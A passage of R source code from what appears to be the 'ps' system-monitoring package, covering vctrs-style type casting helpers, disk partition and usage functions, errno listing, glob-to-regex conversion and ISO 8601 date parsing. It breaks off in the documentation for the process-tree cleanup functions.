          "Can't convert data frame because of missing columns.",
          call. = FALSE
        )
      }

      # Avoid expensive [.data.frame method
      out <- as.list(x)

      # Coerce common columns
      common <- intersect(names(x), names(to))
      out[common] <- Map(vec_cast, out[common], to[common])

      # Add new columns
      from_type <- setdiff(names(to), names(x))
      out[from_type] <- lapply(to[from_type], vec_init, n = vec_size(x))

      # Ensure columns are ordered according to `to`
      out <- out[names(to)]

      new_data_frame(out)
    }

    rlib_df_cast <- function(x, to) {
      new_data_frame(df_cast(x, to), .class = "tbl")
    }
    tib_cast <- function(x, to) {
      new_data_frame(df_cast(x, to), .class = c("tbl_df", "tbl"))
    }

    switch(
      .rlang_vctrs_typeof(to),
      logical = lgl_cast(x, to),
      integer = int_cast(x, to),
      double = dbl_cast(x, to),
      character = chr_cast(x, to),
      list = list_cast(x, to),

      base_data_frame = df_cast(x, to),
      rlib_data_frame = rlib_df_cast(x, to),
      tibble = tib_cast(x, to),

      stop_incompatible_cast(x, to)
    )
  }

  vec_ptype_common <- function(xs, ptype = NULL) {
    if (!is.null(ptype)) {
      return(vec_ptype(ptype))
    }

    xs <- Filter(function(x) !is.null(x), xs)

    if (length(xs) == 0) {
      return(NULL)
    }

    if (length(xs) == 1) {
      out <- vec_ptype(xs[[1]])
    } else {
      xs <- map(xs, vec_ptype)
      out <- Reduce(vec_ptype2, xs)
    }

    vec_ptype_finalise(out)
  }

  vec_ptype_finalise <- function(x) {
    if (is.data.frame(x)) {
      x[] <- lapply(x, vec_ptype_finalise)
      return(x)
    }

    if (inherits(x, "rlang_unspecified")) {
      logical()
    } else {
      x
    }
  }

  vec_ptype <- function(x) {
    if (vec_is_unspecified(x)) {
      return(.rlang_vctrs_unspecified())
    }

    if (is.data.frame(x)) {
      out <- new_data_frame(lapply(x, vec_ptype))

      attrib <- attributes(x)
      attrib$row.names <- attr(out, "row.names")
      attributes(out) <- attrib

      return(out)
    }

    vec_slice(x, 0)
  }

  vec_ptype2 <- function(x, y) {
    stop_incompatible_type <- function(x, y) {
      stop(
        sprintf(
          "Can't combine types <%s> and <%s>.",
          .rlang_vctrs_typeof(x),
          .rlang_vctrs_typeof(y)
        ),
        call. = FALSE
      )
    }

    x_type <- .rlang_vctrs_typeof(x)
    y_type <- .rlang_vctrs_typeof(y)

    if (x_type == "unspecified" && y_type == "unspecified") {
      return(.rlang_vctrs_unspecified())
    }
    if (x_type == "unspecified") {
      return(y)
    }
    if (y_type == "unspecified") {
      return(x)
    }

    df_ptype2 <- function(x, y) {
      set_partition <- function(x, y) {
        list(
          both = intersect(x, y),
          only_x = setdiff(x, y),
          only_y = setdiff(y, x)
        )
      }

      # Avoid expensive [.data.frame
      x <- as.list(vec_slice(x, 0))
      y <- as.list(vec_slice(y, 0))

      # Find column types
      names <- set_partition(names(x), names(y))
      if (length(names$both) > 0) {
        common_types <- Map(vec_ptype2, x[names$both], y[names$both])
      } else {
        common_types <- list()
      }
      only_x_types <- x[names$only_x]
      only_y_types <- y[names$only_y]

      # Combine and construct
      out <- c(common_types, only_x_types, only_y_types)
      out <- out[c(names(x), names$only_y)]
      new_data_frame(out)
    }

    rlib_df_ptype2 <- function(x, y) {
      new_data_frame(df_ptype2(x, y), .class = "tbl")
    }
    tib_ptype2 <- function(x, y) {
      new_data_frame(df_ptype2(x, y), .class = c("tbl_df", "tbl"))
    }

    ptype <- switch(
      x_type,

      logical = switch(
        y_type,
        logical = x,
        integer = y,
        double = y,
        stop_incompatible_type(x, y)
      ),

      integer = switch(
        .rlang_vctrs_typeof(y),
        logical = x,
        integer = x,
        double = y,
        stop_incompatible_type(x, y)
      ),

      double = switch(
        .rlang_vctrs_typeof(y),
        logical = x,
        integer = x,
        double = x,
        stop_incompatible_type(x, y)
      ),

      character = switch(
        .rlang_vctrs_typeof(y),
        character = x,
        stop_incompatible_type(x, y)
      ),

      list = switch(
        .rlang_vctrs_typeof(y),
        list = x,
        stop_incompatible_type(x, y)
      ),

      base_data_frame = switch(
        .rlang_vctrs_typeof(y),
        base_data_frame = ,
        s3_data_frame = df_ptype2(x, y),
        rlib_data_frame = rlib_df_ptype2(x, y),
        tibble = tib_ptype2(x, y),
        stop_incompatible_type(x, y)
      ),

      rlib_data_frame = switch(
        .rlang_vctrs_typeof(y),
        base_data_frame = ,
        rlib_data_frame = ,
        s3_data_frame = rlib_df_ptype2(x, y),
        tibble = tib_ptype2(x, y),
        stop_incompatible_type(x, y)
      ),

      tibble = switch(
        .rlang_vctrs_typeof(y),
        base_data_frame = ,
        rlib_data_frame = ,
        tibble = ,
        s3_data_frame = tib_ptype2(x, y),
        stop_incompatible_type(x, y)
      ),

      stop_incompatible_type(x, y)
    )

    vec_slice(ptype, 0)
  }

  .rlang_vctrs_typeof <- function(x) {
    if (is.object(x)) {
      class <- class(x)

      if (identical(class, "rlang_unspecified")) {
        return("unspecified")
      }
      if (identical(class, "data.frame")) {
        return("base_data_frame")
      }
      if (identical(class, c("tbl", "data.frame"))) {
        return("rlib_data_frame")
      }
      if (identical(class, c("tbl_df", "tbl", "data.frame"))) {
        return("tibble")
      }
      if (inherits(x, "data.frame")) {
        return("s3_data_frame")
      }

      class <- paste0(class, collapse = "/")
      stop(sprintf("Unimplemented class <%s>.", class), call. = FALSE)
    }

    type <- typeof(x)
    switch(
      type,
      NULL = return("null"),
      logical = if (vec_is_unspecified(x)) {
        return("unspecified")
      } else {
        return(type)
      },
      integer = ,
      double = ,
      character = ,
      raw = ,
      list = return(type)
    )

    stop(sprintf("Unimplemented type <%s>.", type), call. = FALSE)
  }

  vec_is_unspecified <- function(x) {
    !is.object(x) &&
      typeof(x) == "logical" &&
      length(x) &&
      all(vapply(x, identical, logical(1), NA))
  }

  .rlang_vctrs_unspecified <- function(x = NULL) {
    structure(
      rep(NA, length(x)),
      class = "rlang_unspecified"
    )
  }

  .rlang_vctrs_s3_method <- function(generic, class, env = parent.frame()) {
    fn <- get(generic, envir = env)

    ns <- asNamespace(topenv(fn))
    tbl <- ns$.__S3MethodsTable__.

    for (c in class) {
      name <- paste0(generic, ".", c)
      if (exists(name, envir = tbl, inherits = FALSE)) {
        return(get(name, envir = tbl))
      }
      if (exists(name, envir = globalenv(), inherits = FALSE)) {
        return(get(name, envir = globalenv()))
      }
    }

    NULL
  }

  environment()
})

data_frame <- compat_vctrs$data_frame

as_data_frame <- function(x) {
  if (is.matrix(x)) {
    x <- as.data.frame(x, stringsAsFactors = FALSE)
  } else {
    x <- compat_vctrs$vec_recycle_common(x)
  }
  compat_vctrs$new_data_frame(x, .class = "tbl")
}

# nocov end
````

### `pscheck/ps/R/disk.R`

````r
#' List all mounted partitions
#'
#' The output is similar the Unix `mount` and `df` commands.
#'
#' @param all Whether to list virtual devices as well. If `FALSE`, on
#' Linux it will still list `overlay` and `grpcfuse` file systems, to
#' provide some useful information in Docker containers.
#' @return A data frame with columns `device`, `mountpoint`,
#' `fstype` and `options`.
#'
#' @family disk functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_disk_partitions(all = TRUE)
#' ps_disk_partitions()

ps_disk_partitions <- function(all = FALSE) {
  assert_flag(all)
  l <- not_null(.Call(ps__disk_partitions, all))

  d <- data_frame(
    device = vapply(l, "[[", character(1), 1),
    mountpoint = vapply(l, "[[", character(1), 2),
    fstype = vapply(l, "[[", character(1), 3),
    options = vapply(l, "[[", character(1), 4)
  )

  if (!all) {
    d <- ps__disk_partitions_filter(d)
  }

  d
}

#' @importFrom utils read.delim

ps__disk_partitions_filter <- function(pt) {
  os <- ps_os_name()

  if (os == "LINUX") {
    fs <- read.delim("/proc/filesystems", header = FALSE, sep = "\t")
    goodfs <- c(fs[[2]][fs[[1]] != "nodev"], "zfs")
    ok <- pt$device != "none" & file.exists(pt$device) & pt$fstype %in% goodfs
    ok <- ok | pt$device %in% c("overlay", "grpcfuse")
    pt <- pt[ok, , drop = FALSE]
  } else if (os == "MACOS") {
    ok <- substr(pt$device, 1, 1) == "/" & file.exists(pt$device)
    pt <- pt[ok, , drop = FALSE]
  }

  pt
}

#' Disk usage statistics, per partition
#'
#' The output is similar to the Unix `df` command.
#'
#'
#' Note that on Unix a small percentage of the disk space (5% typically)
#' is reserved for the superuser. `ps_disk_usage()` returns the space
#' available to the calling user.
#'
#' @param paths The mounted file systems to list. By default all file
#' systems returned by [ps_disk_partitions()] is listed.
#' @return A data frame with columns `mountpoint`, `total`, `used`,
#' `available` and `capacity`.
#'
#' @family disk functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_disk_usage()

ps_disk_usage <- function(paths = ps_disk_partitions()$mountpoint) {
  assert_character(paths)
  l <- .Call(ps__disk_usage, paths)
  os <- ps_os_name()
  if (os == "WINDOWS") {
    ps__disk_usage_format_windows(paths, l)
  } else {
    ps__disk_usage_format_posix(paths, l)
  }
}

ps__disk_usage_format_windows <- function(paths, l) {
  total <- vapply(l, "[[", double(1), 1)
  free <- vapply(l, "[[", double(1), 2)
  freeuser <- vapply(l, "[[", double(1), 3)
  used <- total - free

  d <- data_frame(
    mountpoint = paths,
    total = total,
    used = used,
    available = freeuser,
    capacity = used / total
  )

  d
}

ps__disk_usage_format_posix <- function(paths, l) {
  l2 <- lapply(l, function(fs) {
    total <- fs[[5]] * fs[[1]]
    avail_to_root <- fs[[6]] * fs[[1]]
    avail = fs[[7]] * fs[[1]]
    used <- total - avail_to_root
    total_user <- used + avail
    usage_percent <- used / total_user
    list(total = total, used = used, free = avail, percent = usage_percent)
  })

  d <- data_frame(
    mountpoint = paths,
    total = vapply(l2, "[[", double(1), "total"),
    used = vapply(l2, "[[", double(1), "used"),
    available = vapply(l2, "[[", double(1), "free"),
    capacity = vapply(l2, "[[", double(1), "percent")
  )

  d
}

#' System-wide disk I/O counters
#'
#' Returns a data.frame of system-wide disk I/O counters.
#'
#' Includes the following non-NA fields for all supported platforms:
#' * `read_count`: number of reads
#' * `write_count`: number of writes
#' * `read_bytes`: number of bytes read
#' * `write_bytes`: number of bytes written
#'
#' And for only some platforms:
#' * `read_time`: time spent reading from disk (in milliseconds)
#' * `write_time`: time spent writing to disk (in milliseconds)
#' * `busy_time`: time spent doing actual I/Os (in milliseconds)
#' * `read_merged_count`: number of merged reads (see iostats doc)
#' * `write_merged_count`: number of merged writes (see iostats doc)
#'
#' @return A data frame of one row per disk of I/O stats, with columns
#' `name`, `read_count` `read_merged_count` `read_bytes`, `read_time`,
#' `write_count`, `write_merged_count`, `write_bytes` `write_time`, and
#' `busy_time`.
#'
#' @family disk functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps:::ps_os_name() %in% c("LINUX", "WINDOWS") && !ps:::is_cran_check()
#' ps_disk_io_counters()
ps_disk_io_counters <- function() {
  os <- ps_os_name()
  tab <- if (os == "LINUX") {
    ps__disk_io_counters_linux()
  } else if (os == "WINDOWS") {
    ps__disk_io_counters_windows()
  } else {
    ps__disk_io_counters_macos()
  }

  class(tab) <- c("tbl", "data.frame")
  tab
}

ps__disk_io_counters_windows <- function() {
  l <- .Call(ps__disk_io_counters)
  disk_info <- data_frame(
    name = l[[1]],
    read_count = l[[2]],
    read_merged_count = NA,
    read_bytes = l[[3]],
    read_time = l[[4]],
    write_count = l[[5]],
    write_merged_count = NA,
    write_bytes = l[[6]],
    write_time = l[[7]],
    busy_time = NA
  )

  disk_info[disk_info$name != "", ]
}

ps__disk_io_counters_macos <- function() {
  tab <- not_null(.Call(ps__disk_io_counters))
  data_frame(
    name = names(tab),
    read_count = map_dbl(tab, "[[", 1),
    read_merged_count = NA,
    read_bytes = map_dbl(tab, "[[", 3),
    read_time = map_dbl(tab, "[[", 5),
    write_count = map_dbl(tab, "[[", 2),
    write_merged_count = NA,
    write_bytes = map_dbl(tab, "[[", 4),
    write_time = map_dbl(tab, "[[", 6),
    busy_time = NA
  )
}

#' File system information for files
#'
#' @param paths A path or a vector of paths. `ps_fs_info()` returns
#'   information about the file systems of all paths. `path` may contain
#'   direcories as well.
#' @return Data frame with file system information for each
#'   path in `paths`, one row per path. Common columns for all
#'   operating systems:
#'   * `path`: The input paths, i.e. the `paths` argument.
#'   * `mountpoint`: Directory where the file system is mounted.
#'     On Linux there is a small chance that it was not possible to
#'     look this up, and it is `NA_character_`. This is the drive letter
#'     or the mount directory on Windows, with a trailing `\`.
#'   * `name`: Device name.
#'     On Linux there is a small chance that it was not possible to
#'     look this up, and it is `NA_character_`. On Windows this is the
#'     volume GUID path of the form `\\?\Volume{GUID}\`.
#'   * `type`: File system type (character).
#'     On Linux there is a tiny chance that it was not possible to
#'     look this up, and it is `NA_character_`.
#'   * `block_size`: File system block size. This is the sector size on
#'     Windows, in bytes.
#'   * `transfer_block_size`: Pptimal transfer block size. On Linux it is
#'     currently always the same as `block_size`. This is the cluster size
#'     on Windows, in bytes.
#'   * `total_data_blocks`: Total data blocks in file system. On Windows
#'     this is the number of sectors.
#'   * `free_blocks`: Free blocks in file system. On Windows this is the
#'     number of free sectors.
#'   * `free_blocks_non_superuser`: Free blocks for a non-superuser, which
#'     might be different on Unix. On Windows this is the number of free
#'     sectors for the calling user.
#'   * `id`: File system id. This is a raw vector. On Linux it is
#'     often all zeros. It is always `NULL` on Windows.
#'   * `owner`: User that mounted the file system. On Linux and Windows
#'     this is currently always `NA_real_`.
#'   * `type_code`: Type of file system, a numeric code. On Windows this
#'     this is `NA_real_`.
#'   * `subtype_code`: File system subtype (flavor). On Linux and Windows
#'     this is always `NA_real_`.
#'
#'   The rest of the columns are flags, and they are operating system
#'   dependent.
#'
#'   macOS:
#'
#'   * `RDONLY`: A read-only filesystem.
#'   * `SYNCHRONOUS`: File system is written to synchronously.
#'   * `NOEXEC`: Can't exec from filesystem.
#'   * `NOSUID`: Setuid bits are not honored on this filesystem.
#'   * `NODEV`: Don't interpret special files.
#'   * `UNION`: Union with underlying filesysten.
#'   * `ASYNC`: File system written to asynchronously.
#'   * `EXPORTED`: File system is exported.
#'   * `LOCAL`: File system is stored locally.
#'   * `QUOTA`: Quotas are enabled on this file system.
#'   * `ROOTFS`: This file system is the root of the file system.
#'   * `DOVOLFS`: File system supports volfs.
#'   * `DONTBROWSE`: File system is not appropriate path to user data.
#'   * `UNKNOWNPERMISSIONS`:  VFS will ignore ownership information on
#'     filesystem filesystemtem objects.
#'   * `AUTOMOUNTED`: File system was mounted by automounter.
#'   * `JOURNALED`: File system is journaled.
#'   * `DEFWRITE`: File system should defer writes.
#'   * `MULTILABEL`: MAC support for individual labels.
#'   * `CPROTECT`: File system supports per-file encrypted data protection.
#'
#'   Linux:
#'
#'   * `MANDLOCK`: Mandatory locking is permitted on the filesystem
#'     (see `fcntl(2)`).
#'   * `NOATIME`: Do not update access times; see `mount(2)`.
#'   * `NODEV`: Disallow access to device special files on this filesystem.
#'   * `NODIRATIME`: Do not update directory access times; see mount(2).
#'   * `NOEXEC`: Execution of programs is disallowed on this filesystem.
#'   * `NOSUID`: The set-user-ID and set-group-ID bits are ignored by
#'      `exec(3)` for executable files on this filesystem
#'   * `RDONLY`: This filesystem is mounted read-only.
#'   * `RELATIME`: Update atime relative to mtime/ctime; see `mount(2)`.
#'   * `SYNCHRONOUS`: Writes are synched to the filesystem immediately
#'     (see the description of `O_SYNC` in `open(2)``).
#'   * `NOSYMFOLLOW`: Symbolic links are not followed when resolving paths;
#'     see `mount(2)``.
#'
#'   Windows:
#'
#'   * `CASE_SENSITIVE_SEARCH`: Supports case-sensitive file names.
#'   * `CASE_PRESERVED_NAMES`: Supports preserved case of file names when
#'      it places a name on disk.
#'   * `UNICODE_ON_DISK`: Supports Unicode in file names as they appear on
#'      disk.
#'   * `PERSISTENT_ACLS`: Preserves and enforces access control lists
#'      (ACL). For example, the NTFS file system preserves and enforces
#'      ACLs, and the FAT file system does not.
#'   * `FILE_COMPRESSION`: Supports file-based compression.
#'   * `VOLUME_QUOTAS`: Supports disk quotas.
#'   * `SUPPORTS_SPARSE_FILES`: Supports sparse files.
#'   * `SUPPORTS_REPARSE_POINTS`: Supports reparse points.
#'   * `SUPPORTS_REMOTE_STORAGE`: Supports remote storage.
#'   * `RETURNS_CLEANUP_RESULT_INFO`: On a successful cleanup operation,
#'      the file system returns information that describes additional
#'      actions taken during cleanup, such as deleting the file. File
#'      system filters can examine this information in their post-cleanup
#'      callback.
#'   * `SUPPORTS_POSIX_UNLINK_RENAME`: Supports POSIX-style delete and
#'      rename operations.
#'   * `VOLUME_IS_COMPRESSED`: It is a compressed volume, for example, a
#'      DoubleSpace volume.
#'   * `SUPPORTS_OBJECT_IDS`: Supports object identifiers.
#'   * `SUPPORTS_ENCRYPTION`: Supports the Encrypted File System (EFS).
#'   * `NAMED_STREAMS`: Supports named streams.
#'   * `READ_ONLY_VOLUME`: It is read-only.
#'   * `SEQUENTIAL_WRITE_ONCE`: Supports a single sequential write.
#'   * `SUPPORTS_TRANSACTIONS`: Supports transactions.
#'   * `SUPPORTS_HARD_LINKS`: The volume supports hard links.
#'   * `SUPPORTS_EXTENDED_ATTRIBUTES`: Supports extended attributes.
#'   * `SUPPORTS_OPEN_BY_FILE_ID`: Supports open by FileID.
#'   * `SUPPORTS_USN_JOURNAL`: Supports update sequence number (USN)
#'      journals.
#'   * `SUPPORTS_INTEGRITY_STREAMS`: Supports integrity streams.
#'   * `SUPPORTS_BLOCK_REFCOUNTING`: The volume supports sharing logical
#'      clusters between files on the same volume.
#'   * `SUPPORTS_SPARSE_VDL`: The file system tracks whether each cluster
#'      of a file contains valid data (either from explicit file writes or
#'      automatic zeros) or invalid data (has not yet been written to or
#'      zeroed).
#'   * `DAX_VOLUME`: The volume is a direct access (DAX) volume.
#'   * `SUPPORTS_GHOSTING`: Supports ghosting.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_fs_info(c("/", "~", "."))

ps_fs_info <- function(paths = "/") {
  assert_character(paths)
  abspaths <- normalizePath(paths, mustWork = TRUE)
  mps <- ps_fs_mount_point(paths)
  res <- .Call(ps__fs_info, paths, abspaths, mps)
  df <- as_data_frame(res)

  # this should not happen in practice, but just in case
  if (ps_os_type()[["LINUX"]] && any(is.na(df$type))) {
    miss <- which(is.na(df$type))
    df$type[miss] <- linux_fs_types$name[match(
      df$type_code[miss],
      linux_fs_types$id
    )]
  }

  df
}

linux_fs_types <- utils::read.table(
  "tools/linux-fs-types.txt",
  header = TRUE,
  stringsAsFactors = FALSE
)

posix_stat_types <- c(
  "regular file",
  "directory",
  "character device",
  "block device",
  "FIFO",
  "symbolic link",
  "socket"
)

#' File status
#'
#' This function is currently not implemented on Windows.
#'
#' @param paths Paths to files, directories, devices, etc. They must
#'   exist. They are expanded using [base::path.expand()].
#' @param follow Whether to follow symbolic links. If `FALSE` it returns
#'   information on the links themselves.
#' @return Data frame with one row for each path in `paths`. Columns:
#'   * `path`: Expanded `paths`.
#'   * `dev_major`: Major device ID of the device the path resides on.
#'   * `dev_minor`: Minor device ID of the device the path resodes on.
#'   * `inode`: Inode number.
#'   * `mode`: File type and mode (permissions). It is easier to use the
#'     `type` and `permissions` columns.
#'   * `type`: File type, character. One of
#'     `r paste(posix_stat_types, collapse = ", ")`.
#'   * `permissions`: Permissions, numeric code in an integer column.
#'   * `nlink`: Number of hard links.
#'   * `uid`: User id of owner.
#'   * `gid`: Group id of owner.
#'   * `rdev_major`: If the path is a device, its major device id,
#'     otherwise `NA_integer_`.
#'   * `rdev_minor`: IF the path is a device, its minor device id,
#'     otherwise `NA_integer_`.
#'   * `size`: File size in bytes.
#'   * `block_size`: Block size for filesystem I/O.
#'   * `blocks`: Number of 512B blocks allocated.
#'   * `access_time`: Time of last access.
#'   * `modification_time`: Time of last modification.
#'   * `change_time`: Time of last status change.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check() && ps_os_type()[["POSIX"]]
#' ps_fs_stat(c(".", tempdir()))

ps_fs_stat <- function(paths, follow = TRUE) {
  assert_character(paths)
  paths <- path.expand(paths)
  res <- .Call(ps__stat, paths, follow)
  res[["type"]] <- posix_stat_types[res[["type"]]]
  res[["access_time"]] <- .POSIXct(res[["access_time"]], "UTC")
  res[["modification_time"]] <- .POSIXct(res[["modification_time"]], "UTC")
  res[["change_time"]] <- .POSIXct(res[["change_time"]], "UTC")
  as_data_frame(res)
}

#' Find the mount point of a file or directory
#'
#' @param paths Paths to files, directories, devices, etc. They must
#'   exist. They are normalized using [base::normalizePath()].
#' @return Character vector, paths to the mount points of the input
#'   `paths`.
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_fs_mount_point(".")

ps_fs_mount_point <- function(paths) {
  assert_character(paths)
  paths <- normalizePath(paths, mustWork = TRUE)
  call_with_cleanup(ps__mount_point, paths)
}
````

### `pscheck/ps/R/errno.R`

````r
#' List of 'errno' error codes
#'
#' For the errors that are not used on the current platform, `value` is
#' `NA_integer_`.
#'
#' A data frame with columns: `name`, `value`, `description`.
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' errno()

errno <- function() {
  err <- as.list(ps_env$constants$errno)
  err <- err[order(names(err))]
  data_frame(
    name = names(err),
    value = vapply(err, "[[", integer(1), 1),
    description = vapply(err, "[[", character(1), 2)
  )
}
````

### `pscheck/ps/R/error.R`

````r
ps__invalid_argument <- function(arg, ...) {
  msg <- paste0(encodeString(arg, quote = "`"), ...)
  structure(
    list(message = msg),
    class = c("invalid_argument", "error", "condition")
  )
}
````

### `pscheck/ps/R/glob.R`

````r
glob <- local({
  to_regex <- function(glob) {
    restr <- new.env(parent = emptyenv(), size = 1003)
    idx <- 0L
    chr <- strsplit(glob, "", fixed = TRUE)[[1]]
    in_group <- FALSE

    for (c in chr) {
      if (c %in% c("/", "$", "^", "+", ".", "(", ")", "=", "!", "|")) {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- paste0("\\", c)
      } else if (c == "?") {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- "."
      } else if (c == "[" || c == "]") {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- c
      } else if (c == "{") {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- "("
        in_group <- TRUE
      } else if (c == "}") {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- ")"
        in_group <- FALSE
      } else if (c == ",") {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- if (in_group) "|" else paste0("\\", c)
      } else if (c == "*") {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- ".*"
      } else {
        idx <- idx + 1L
        restr[[as.character(idx)]] <- c
      }
    }

    paste0(
      "^",
      paste(mget(as.character(seq_len(idx)), restr), collapse = ""),
      "$"
    )
  }

  test <- function(glob, paths) {
    re <- to_regex(glob)
    grepl(re, paths)
  }

  test_any <- function(globs, paths) {
    if (!length(paths)) {
      return(logical())
    }
    res <- vapply(globs, to_regex, character(1))
    m <- matrix(
      as.logical(unlist(lapply(res, grepl, x = paths))),
      nrow = length(paths)
    )
    apply(m, 1, any)
  }

  structure(
    list(
      .internal = environment(),
      to_regex = to_regex,
      test = test,
      test_any = test_any
    ),
    class = c("standalone_glob", "standalone")
  )
})
````

### `pscheck/ps/R/iso-date.R`

````r
milliseconds <- function(x) as.difftime(as.numeric(x) / 1000, units = "secs")
seconds <- function(x) as.difftime(as.numeric(x), units = "secs")
minutes <- function(x) as.difftime(as.numeric(x), units = "mins")
hours <- function(x) as.difftime(as.numeric(x), units = "hours")
days <- function(x) as.difftime(as.numeric(x), units = "days")
weeks <- function(x) as.difftime(as.numeric(x), units = "weeks")
wday <- function(x) as.POSIXlt(x, tz = "UTC")$wday + 1
with_tz <- function(x, tzone = "") as.POSIXct(as.POSIXlt(x, tz = tzone))
ymd <- function(x) as.POSIXct(x, format = "%Y %m %d", tz = "UTC")
yj <- function(x) as.POSIXct(x, format = "%Y %j", tz = "UTC")

parse_iso_8601 <- function(dates, default_tz = "UTC") {
  if (default_tz == "") {
    default_tz <- Sys.timezone()
  }
  dates <- as.character(dates)
  match <- re_match(dates, iso_regex)
  matching <- !is.na(match$.match)
  result <- rep(.POSIXct(NA_real_, tz = ""), length.out = length(dates))
  result[matching] <- parse_iso_parts(match[matching, ], default_tz)
  class(result) <- c("POSIXct", "POSIXt")
  with_tz(result, "UTC")
}

parse_iso_parts <- function(mm, default_tz) {
  num <- nrow(mm)

  ## -----------------------------------------------------------------
  ## Date first

  date <- .POSIXct(rep(NA_real_, num), tz = "")

  ## Years-days
  fyd <- is.na(date) & mm$yearday != ""
  date[fyd] <- yj(paste(mm$year[fyd], mm$yearday[fyd]))

  ## Years-weeks-days
  fywd <- is.na(date) & mm$week != "" & mm$weekday != ""
  date[fywd] <- iso_week(mm$year[fywd], mm$week[fywd], mm$weekday[fywd])

  ## Years-weeks
  fyw <- is.na(date) & mm$week != ""
  date[fyw] <- iso_week(mm$year[fyw], mm$week[fyw], "1")

  ## Years-months-days
  fymd <- is.na(date) & mm$month != "" & mm$day != ""
  date[fymd] <- ymd(paste(mm$year[fymd], mm$month[fymd], mm$day[fymd]))

  ## Years-months
  fym <- is.na(date) & mm$month != ""
  date[fym] <- ymd(paste(mm$year[fym], mm$month[fym], "01"))

  ## Years
  fy <- is.na(date)
  date[fy] <- ymd(paste(mm$year, "01", "01"))

  ## -----------------------------------------------------------------
  ## Now the time

  th <- mm$hour != ""
  date[th] <- date[th] + hours(mm$hour[th])

  tm <- mm$min != ""
  date[tm] <- date[tm] + minutes(mm$min[tm])

  ts <- mm$sec != ""
  date[ts] <- date[ts] + seconds(mm$sec[ts])

  ## -----------------------------------------------------------------
  ## Fractional time

  frac <- as.numeric(sub(",", ".", mm$frac))

  tfs <- !is.na(frac) & mm$sec != ""
  date[tfs] <- date[tfs] + milliseconds(round(frac[tfs] * 1000))

  tfm <- !is.na(frac) & mm$sec == "" & mm$min != ""
  sec <- trunc(frac[tfm] * 60)
  mil <- round((frac[tfm] * 60 - sec) * 1000)
  date[tfm] <- date[tfm] + seconds(sec) + milliseconds(mil)

  tfh <- !is.na(frac) & mm$sec == "" & mm$min == ""
  min <- trunc(frac[tfh] * 60)
  sec <- trunc((frac[tfh] * 60 - min) * 60)
  mil <- round((((frac[tfh] * 60) - min) * 60 - sec) * 1000)
  date[tfh] <- date[tfh] + minutes(min) + seconds(sec) + milliseconds(mil)

  ## -----------------------------------------------------------------
  ## Time zone

  ftzpm <- mm$tzpm != ""
  m <- ifelse(mm$tzpm[ftzpm] == "+", -1, 1)
  ftzpmh <- ftzpm & mm$tzhour != ""
  date[ftzpmh] <- date[ftzpmh] + m * hours(mm$tzhour[ftzpmh])
  ftzpmm <- ftzpm & mm$tzmin != ""
  date[ftzpmm] <- date[ftzpmm] + m * minutes(mm$tzmin[ftzpmm])

  ftzz <- mm$tz == "Z"
  date[ftzz] <- as.POSIXct(date[ftzz], "UTC")

  ftz <- mm$tz != "Z" & mm$tz != ""
  date[ftz] <- as.POSIXct(date[ftz], mm$tz[ftz])

  if (default_tz != "UTC") {
    ftna <- mm$tzpm == "" & mm$tz == ""
    if (any(ftna)) {
      dd <- as.POSIXct(
        format_iso_8601(date[ftna]),
        "%Y-%m-%dT%H:%M:%S+00:00",
        tz = default_tz
      )
      date[ftna] <- dd
    }
  }

  as.POSIXct(date, "UTC")
}

iso_regex <- paste0(
  "^\\s*",
  "(?<year>[\\+-]?\\d{4}(?!\\d{2}\\b))",
  "(?:(?<dash>-?)",
  "(?:(?<month>0[1-9]|1[0-2])",
  "(?:\\g{dash}(?<day>[12]\\d|0[1-9]|3[01]))?",
  "|W(?<week>[0-4]\\d|5[0-3])(?:-?(?<weekday>[1-7]))?",
  "|(?<yearday>00[1-9]|0[1-9]\\d|[12]\\d{2}|3",
  "(?:[0-5]\\d|6[1-6])))",
  "(?<time>[T\\s](?:(?:(?<hour>[01]\\d|2[0-3])",
  "(?:(?<colon>:?)(?<min>[0-5]\\d))?|24\\:?00)",
  "(?<frac>[\\.,]\\d+(?!:))?)?",
  "(?:\\g{colon}(?<sec>[0-5]\\d)(?:[\\.,]\\d+)?)?",
  "(?<tz>[zZ]|(?<tzpm>[\\+-])",
  "(?<tzhour>[01]\\d|2[0-3]):?(?<tzmin>[0-5]\\d)?)?)?)?$"
)

iso_week <- function(year, week, weekday) {
  wdmon <- function(date) {
    (wday(date) + 5L) %% 7L
  }
  thu <- function(date) {
    date - days(wdmon(date) - 3L)
  }

  thu(ymd(paste(year, "01", "04"))) +
    weeks(as.numeric(week) - 1L) +
    days(as.numeric(weekday) - 4L)
}

format_iso_8601 <- function(date) {
  format(as.POSIXlt(date, tz = "UTC"), "%Y-%m-%dT%H:%M:%S+00:00")
}
````

### `pscheck/ps/R/kill-tree.R`

````r
#' Mark a process and its (future) child tree
#'
#' `ps_mark_tree()` generates a random environment variable name and sets
#' it in the  current R process. This environment variable will be (by
#' default) inherited by all child (and grandchild, etc.) processes, and
#' will help finding these processes, even if and when they are (no longer)
#' related to the current R process. (I.e. they are not connected in the
#' process tree.)
#'
#' `ps_find_tree()` finds the processes that set the supplied environment
#' variable and returns them in a list.
#'
#' `ps_kill_tree()` finds the processes that set the supplied environment
#' variable, and kills them (or sends them the specified signal on Unix).
#'
#' `with_process_cleanup()` evaluates an R expression, and cleans up all
#' external processes that were started by the R process while evaluating
#' the expression. This includes child processes of child processes, etc.,
#' recursively. It returns a list with entries: `result` is the result of
#' the expression, `visible` is TRUE if the expression should be printed
#' to the screen, and `process_cleanup` is a named integer vector of the
#' cleaned pids, names are the process names.
#'
#' If `expr` throws an error, then so does `with_process_cleanup()`, the
#' same error. Nevertheless processes are still cleaned up.
#'
#' @section macOS issues:
#'
#' These functions do not work on macOS, unless specific criteria are
#' met. See [ps_environ()] for details.
#'
#' @section Note:
